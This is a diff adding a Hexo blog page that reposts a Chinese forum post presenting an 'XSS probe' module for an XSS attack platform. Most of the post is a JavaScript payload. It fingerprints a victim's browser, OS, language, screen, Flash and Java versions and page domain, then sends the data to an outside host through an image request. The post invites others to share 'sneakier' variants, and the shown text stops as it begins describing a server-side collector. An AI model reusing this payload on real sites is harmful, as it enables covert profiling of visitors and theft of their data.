@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="xss探针," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="一个完善强大的xss探针对渗透个人机至关重要，怎么才算一个比较完善强大的xss探针呢？首先，兼容性好，兼容主流浏览器（ie、chrome、firefox、safari）。其次，具备以下功能：实现功能:   domain    screen&amp;nbsp;&amp;nbsp;//初步判断台式机还是笔记本   browser_name    browser_version   language    Osyste">
+<meta name="keywords" content="xss探针">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[XSS Platform] xss探针模块">
+<meta property="og:url" content="http://yoursite.com/2013/09/04/XSS-Platform-xss探针模块/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一个完善强大的xss探针对渗透个人机至关重要，怎么才算一个比较完善强大的xss探针呢？首先，兼容性好，兼容主流浏览器（ie、chrome、firefox、safari）。其次，具备以下功能：实现功能:   domain    screen&amp;nbsp;&amp;nbsp;//初步判断台式机还是笔记本   browser_name    browser_version   language    Osyste">
+<meta property="og:image" content="http://lanu-upload.stor.sinaapp.com/201309/3b1d12c0be6401c70c08429aa8f8766f201309041913472035883472.jpg">
+<meta property="og:image" content="http://lanu-upload.stor.sinaapp.com/201309/e7c1f8d49689e645887525f4699ecebf201309041913461985046721.jpg">
+<meta property="og:updated_time" content="2018-02-26T06:01:13.096Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[XSS Platform] xss探针模块">
+<meta name="twitter:description" content="一个完善强大的xss探针对渗透个人机至关重要，怎么才算一个比较完善强大的xss探针呢？首先，兼容性好，兼容主流浏览器（ie、chrome、firefox、safari）。其次，具备以下功能：实现功能:   domain    screen&amp;nbsp;&amp;nbsp;//初步判断台式机还是笔记本   browser_name    browser_version   language    Osyste">
+<meta name="twitter:image" content="http://lanu-upload.stor.sinaapp.com/201309/3b1d12c0be6401c70c08429aa8f8766f201309041913472035883472.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2013/09/04/XSS-Platform-xss探针模块/"/>
+
+
+
+
+
+  <title>[XSS Platform] xss探针模块 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/09/04/XSS-Platform-xss探针模块/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">[XSS Platform] xss探针模块</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-09-04T19:01:34+08:00">
+                2013-09-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HTML-CSS-JS-xss-xml/" itemprop="url" rel="index">
+                    <span itemprop="name">HTML|CSS|JS|xss|xml</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <div class="t_msgfontfix" style="word-wrap:break-word;line-height:normal;min-height:100px;color:#444444;font-family:Verdana, Helvetica, Arial, sans-serif;"><table cellspacing="0" cellpadding="0" style="word-wrap:break-word;empty-cells:show;width:1337px;table-layout:fixed;margin-left:1px;" class="ke-zeroborder"><tbody style="word-wrap:break-word;"><tr style="word-wrap:break-word;"><td class="t_msgfont" id="postmessage_77510" style="word-wrap:break-word;color:#444444;font-size:14px;line-height:1.6em;font-family:Verdana, Helvetica, Arial, sans-serif;">一个完善强大的xss探针对渗透个人机至关重要，怎么才算一个比较完善强大的xss探针呢？<br><br>首先，兼容性好，兼容主流浏览器（ie、chrome、firefox、safari）。<br><br>其次，具备以下功能：<br><br>实现功能:<br><br><em>   domain
+</em>   screen&nbsp;&nbsp;//初步判断台式机还是笔记本<br><em>   browser_name
+</em>   browser_version<br><em>   language
+</em>   Osystem<br><em>   flash_version
+</em>   java_version<br><span style="word-wrap:break-word;line-height:normal;font-family:’Helvetica Neue, Arial, Helvetica, sans-serif ’;"><span style="word-wrap:break-word;color:#222222;"><span style="word-wrap:break-word;font-size:12px;">没有实现功能：</span></span></span><br><br><em>   antivirus
+</em>   browser_expand<br>*   pc_software<br><br>希望各位大牛共享下你们自己的高端大气上档次的代码，没有最猥琐，只有更猥琐<br><br>我先共享下我个人胡乱写的一<span style="word-wrap:break-word;line-height:normal;font-size:12px;">个xss platform 探针模块</span><br><br><span style="word-wrap:break-word;line-height:normal;font-size:12px;">代码1：</span><br><br><span style="word-wrap:break-word;line-height:normal;font-size:12px;"><a href="http://lanu-upload.stor.sinaapp.com/201309/3b1d12c0be6401c70c08429aa8f8766f201309041913472035883472.jpg" target="_blank" rel="noopener"><img src="http://lanu-upload.stor.sinaapp.com/201309/3b1d12c0be6401c70c08429aa8f8766f201309041913472035883472.jpg" alt="点击查看原图"></a>&nbsp;<br><br></span><br><br><div class="blockcode" style="word-wrap:break-word;line-height:normal;margin:10px 0px;padding:10px 0px 5px 10px;width:586px;border:1px solid #cccccc;background-image:url(https://forum.90sec.org/images/default/codebg.gif);background-color:#f7f7f7;overflow:hidden;background-position:0px 0px;background-repeat:no-repeat repeat;"><div id="code0" style="word-wrap:break-word;"><br><br>1.  var info = {};var deployJava=function(){function g(n){if(!d.debug){return}if(console.log){console.log(n)}else{alert(n)}}var d={debug:null,version:”20120801”,firefoxJavaVersion:null,oldMimeType:”application/npruntime-scriptable-plugin;DeploymentToolkit”,mimeType:”application/java-deployment-toolkit”,browserName:null,browserName2:null,getJREs:function(){var r=new Array();if(this.isPluginInstalled()){var q=this.getPlugin();var n=q.jvms;for(var p=0;p&lt;n.getLength();p++){r[p]=n.get(p).version}}else{var o=this.getBrowser();if(o==”MSIE”){if(this.testUsingActiveX(“1.7.0”)){r[0]=”1.7.0”}else{if(this.testUsingActiveX(“1.6.0”)){r[0]=”1.6.0”}else{if(this.testUsingActiveX(“1.5.0”)){r[0]=”1.5.0”}else{if(this.testUsingActiveX(“1.4.2”)){r[0]=”1.4.2”}else{if(this.testForMSVM()){r[0]=”1.1”}}}}}}else{if(o==”Netscape Family”){this.getJPIVersionUsingMimeType();if(this.firefoxJavaVersion!=null){r[0]=this.firefoxJavaVersion}else{if(this.testUsingMimeTypes(“1.7”)){r[0]=”1.7.0”}else{if(this.testUsingMimeTypes(“1.6”)){r[0]=”1.6.0”}else{if(this.testUsingMimeTypes(“1.5”)){r[0]=”1.5.0”}else{if(this.testUsingMimeTypes(“1.4.2”)){r[0]=”1.4.2”}else{if(this.browserName2==”Safari”){if(this.testUsingPluginsArray(“1.7.0”)){r[0]=”1.7.0”}else{if(this.testUsingPluginsArray(“1.6”)){r[0]=”1.6.0”}else{if(this.testUsingPluginsArray(“1.5”)){r[0]=”1.5.0”}else{if(this.testUsingPluginsArray(“1.4.2”)){r[0]=”1.4.2”}}}}}}}}}}}}}if(this.debug){for(var p=0;p&lt;r.length;++p){g(“[getJREs()] We claim to have detected Java SE “+r[p])}}return r},getJPIVersionUsingMimeType:function(){for(var o=0;o&lt;navigator.mimeTypes.length;++o){var p=navigator.mimeTypes[o].type;var n=p.match(/^application/x-java-applet;jpi-version=(.&amp;#42)$/);if(n!=null){this.firefoxJavaVersion=n[1];if(“Opera”!=this.browserName2){break}}}},isPluginInstalled:function(){var n=this.getPlugin();if(n&amp;&amp;n.jvms){return true}else{return false}},allowPlugin:function(){this.getBrowser();var n=(“Safari”!=this.browserName2&amp;&amp;”Opera”!=this.browserName2);return n},getPlugin:function(){this.refresh();var n=null;if(this.allowPlugin()){n=document.getElementById(“deployJavaPlugin”)}return n},compareVersionToPattern:function(u,o,q,r){if(u==undefined||o==undefined){return false}var v=”^(\d+)(?:.(\d+)(?:.(\d+)(?:_(\d+))?)?)?[&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;DISCUZ_CODE_0&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;]quot;;var w=u.match(v);if(w!=null){var t=0;var x=new Array();for(var p=1;p&lt;w.length;++p){if((typeof w[p]==”string”)&amp;&amp;(w[p]!=””)){x[t]=w[p];t++}}var n=Math.min(x.length,o.length);if(r){for(var p=0;p&lt;n;++p){if(x[p]&lt;o[p]){return false}else{if(x[p]&gt;o[p]){return true}}}return true}else{for(var p=0;p&lt;n;++p){if(x[p]!=o[p]){return false}}if(q){return true}else{return(x.length==o.length)}}}else{return false}},getBrowser:function(){if(this.browserName==null){var n=navigator.userAgent.toLowerCase();g(“[getBrowser()] navigator.userAgent.toLowerCase() -&gt; “+n);if((n.indexOf(“msie”)!=-1)&amp;&amp;(n.indexOf(“opera”)==-1)){this.browserName=”MSIE”;this.browserName2=”MSIE”}else{if(n.indexOf(“iphone”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”iPhone”}else{if((n.indexOf(“firefox”)!=-1)&amp;&amp;(n.indexOf(“opera”)==-1)){this.browserName=”Netscape Family”;this.browserName2=”Firefox”}else{if(n.indexOf(“chrome”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”Chrome”}else{if(n.indexOf(“safari”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”Safari”}else{if((n.indexOf(“mozilla”)!=-1)&amp;&amp;(n.indexOf(“opera”)==-1)){this.browserName=”Netscape Family”;this.browserName2=”Other”}else{if(n.indexOf(“opera”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”Opera”}else{this.browserName=”?”;this.browserName2=”unknown”}}}}}}}g(“[getBrowser()] Detected browser name:”+this.browserName+”, “+this.browserName2)}return this.browserName},testUsingActiveX:function(n){var p=”JavaWebStart.isInstalled.”+n+”.0”;if(typeof ActiveXObject==”undefined”||!ActiveXObject){g(“[testUsingActiveX()] Browser claims to be IE, but no ActiveXObject object?”);return false}try{return(new ActiveXObject(p)!=null)}catch(o){return false}},testForMSVM:function(){var o=”{08B0E5C0-4FCB-11CF-AAA5-00401C608500}”;if(typeof oClientCaps!=”undefined”){var n=oClientCaps.getComponentVersion(o,”ComponentID”);if((n==””)||(n==”5,0,5000,0”)){return false}else{return true}}else{return false}},testUsingMimeTypes:function(o){if(!navigator.mimeTypes){g(“[testUsingMimeTypes()] Browser claims to be Netscape family, but no mimeTypes[] array?”);return false}for(var p=0;p&lt;navigator.mimeTypes.length;++p){s=navigator.mimeTypes[p].type;var n=s.match(/^application/x-java-appletx3Bversion=(1.8|1.7|1.6|1.5|1.4.2)$/);if(n!=null){if(this.compareVersions(n[1],o)){return true}}}return false},testUsingPluginsArray:function(o){if((!navigator.plugins)||(!navigator.plugins.length)){return false}var n=navigator.platform.toLowerCase();for(var p=0;p&lt;navigator.plugins.length;++p){s=navigator.plugins[p].description;if(s.search(/^Java Switchable Plug-in (Cocoa)/)!=-1){if(this.compareVersions(“1.5.0”,o)){return true}}else{if(s.search(/^Java/)!=-1){if(n.indexOf(“win”)!=-1){if(this.compareVersions(“1.5.0”,o)||this.compareVersions(“1.6.0”,o)){return true}}}}}if(this.compareVersions(“1.5.0”,o)){return true}return false},compareVersions:function(q,r){var o=q.split(“.”);var n=r.split(“.”);for(var p=0;p&lt;o.length;++p){o[p]=Number(o[p])}for(var p=0;p&lt;n.length;++p){n[p]=Number(n[p])}if(o.length==2){o[2]=0}if(o[0]&gt;n[0]){return true}if(o[0]&lt;n[0]){return false}if(o[1]&gt;n[1]){return true}if(o[1]&lt;n[1]){return false}if(o[2]&gt;n[2]){return true}if(o[2]&lt;n[2]){return false}return true},refresh:function(){navigator.plugins.refresh(false);var n=this.getBrowser();if(n==”Netscape Family”&amp;&amp;this.allowPlugin()){var o=document.getElementById(“deployJavaPlugin”);if(o==null){this.writeEmbedTag()}}},writeEmbedTag:function(){var n=false;if(navigator.mimeTypes!=null){for(var o=0;o&lt;navigator.mimeTypes.length;o++){if(navigator.mimeTypes[o].type==this.mimeType){if(navigator.mimeTypes[o].enabledPlugin){document.write(’&lt;embed id=”deployJavaPlugin” type=”’+this.mimeType+’” hidden=”true” /&gt;’);n=true}}}if(!n){for(var o=0;o&lt;navigator.mimeTypes.length;o++){if(navigator.mimeTypes[o].type==this.oldMimeType){if(navigator.mimeTypes[o].enabledPlugin){document.write(’&lt;embed id=”deployJavaPlugin” type=”’+this.oldMimeType+’” hidden=”true” /&gt;’)}}}}}}};return d}();<br><br>2.  //网站域名info.domain = document.domain;/&amp;#42//网页标题info.title = document.title;&amp;#42///屏幕分辨率info.screen = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var c = “”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (self.screen) {c = screen.width+”x”+screen.height;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return c;}();<br><br>3.  //浏览器和版本info.browser = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var Sys = {};&nbsp; &nbsp; var ua = navigator.userAgent.toLowerCase();&nbsp; &nbsp; var s;&nbsp; &nbsp; (s = ua.match(/msie ([d.]+)/)) ? Sys.ie = s[1] :&nbsp; &nbsp; (s = ua.match(/firefox/([d.]+)/)) ? Sys.firefox = s[1] :&nbsp; &nbsp; (s = ua.match(/chrome/([d.]+)/)) ? Sys.chrome = s[1] :&nbsp; &nbsp; (s = ua.match(/opera.([d.]+)/)) ? Sys.opera = s[1] :&nbsp; &nbsp; (s = ua.match(/version/([d.]+).&amp;#42safari/)) ? Sys.safari = s[1] : 0;&nbsp; &nbsp; if (Sys.ie) return {name: ’IE’&nbsp;&nbsp;|| “”, version: Sys.ie || “0”};&nbsp; &nbsp; if (Sys.firefox) return {name: ’Firefox’ || “”, version: Sys.firefox || “0”};&nbsp; &nbsp; if (Sys.chrome) return {name: ’Chrome’ || “”, version: Sys.chrome || “0”};&nbsp; &nbsp; if (Sys.opera) return {name: ’Opera’ || “”, version: Sys.opera || “0”};&nbsp; &nbsp; if (Sys.safari) return {name: ’Safari’ || “”, version: Sys.safari || “0”};}();<br><br>4.  //浏览器语言info.lang = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var type=navigator.appName&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (type==”Netscape”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; var lang = navigator.language;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; var lang = navigator.userLanguage;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return lang;}();<br><br>5.  //系统平台info.system = function (){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var appVer = navigator.userAgent;&nbsp; &nbsp; var _pf = navigator.platform;&nbsp; &nbsp;&nbsp; &nbsp;if(_pf == “Win32” || _pf == “Windows”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; if(appVer.indexOf(“Windows NT 6.0”) &gt; -1&nbsp;&nbsp;|| appVer.indexOf(“Windows Vista”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’Windows Vista’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else if(appVer.indexOf(“Windows NT 6.1”) &gt; -1 || appVer.indexOf(“Windows 7”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’Windows 7’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }else if(appVer.indexOf(“Windows NT 6.2”) &gt; -1 || appVer.indexOf(“Windows 8”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return ’Windows 8’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;try{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;var _winName = Array(’2000’,’XP’,’2003’);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;var _ntNum = appVer.match(/Windows NT 5.d/i).toString();&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return ’Windows ’ + _winName[_ntNum.replace(/Windows NT 5.(d)/i,”$1”)];&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}catch(e){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’Windows’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;}else if(_pf == “Mac68K” || _pf == “MacPPC” || _pf == “Macintosh”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Mac”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else if(_pf == “X11”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Unix”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else if(String(_pf).indexOf(“Linux”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Linux”;&nbsp; &nbsp;&nbsp; &nbsp; }else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Unknow”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}();&nbsp;&nbsp;<br><br>6.  //flash版本info.flash = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var f=””,n=navigator;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (n.plugins &amp;&amp; n.plugins.length) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; for (var ii=0;ii&lt;n.plugins.length;ii++) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if (n.plugins[ii].name.indexOf(’Shockwave Flash’)!=-1) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;f=n.plugins[ii].description.split(’Shockwave Flash ’)[1];&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;break;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;else&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (window.ActiveXObject) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; for (var ii=10;ii&gt;=2;ii–) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;try {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var fl=eval(“new ActiveXObject(’ShockwaveFlash.ShockwaveFlash.”+ii+”’);”);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (fl) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; f=ii + ’.0’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; break;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; catch(e) {}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return f;}(); //java版本info.java = deployJava.getJREs();<br><br>7.  function json2str(o) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var arr = [];&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var fmt = function(s) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; if (typeof s == ’object’ &amp;&amp; s != null) return json2str(s);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return /^(string|number)$/.test(typeof s) ? “”” + s + “”” : s;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;for (var i in o) arr.push(“”” + i + “”:” + fmt(o[i]));&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’{’ + arr.join(’,’) + ’}’;}&nbsp;<br><br>8.  var i = json2str(info);x=new Image();x.src = “<a href="http://xssprobe.sinaapp.com/probe.php?id={projectId}&amp;c=&quot;+i;//自定义" target="_blank" rel="noopener">http://xssprobe.sinaapp.com/probe.php?id={projectId}&amp;c=&quot;+i;//自定义</a><br></div><br><span style="word-wrap:break-word;margin-left:43px;font-size:12px;cursor:pointer;color:#666666;">复制代码</span></div>
+
+<p>设置参数：</p>
+<p><a href="http://lanu-upload.stor.sinaapp.com/201309/e7c1f8d49689e645887525f4699ecebf201309041913461985046721.jpg" target="_blank" rel="noopener"><img src="http://lanu-upload.stor.sinaapp.com/201309/e7c1f8d49689e645887525f4699ecebf201309041913461985046721.jpg" alt="点击查看原图"></a>&nbsp;</p>
+<p>代码2：根目录下新建文件<span style="word-wrap:break-word;line-height:normal;font-size:12px;">probe.php</span></p>
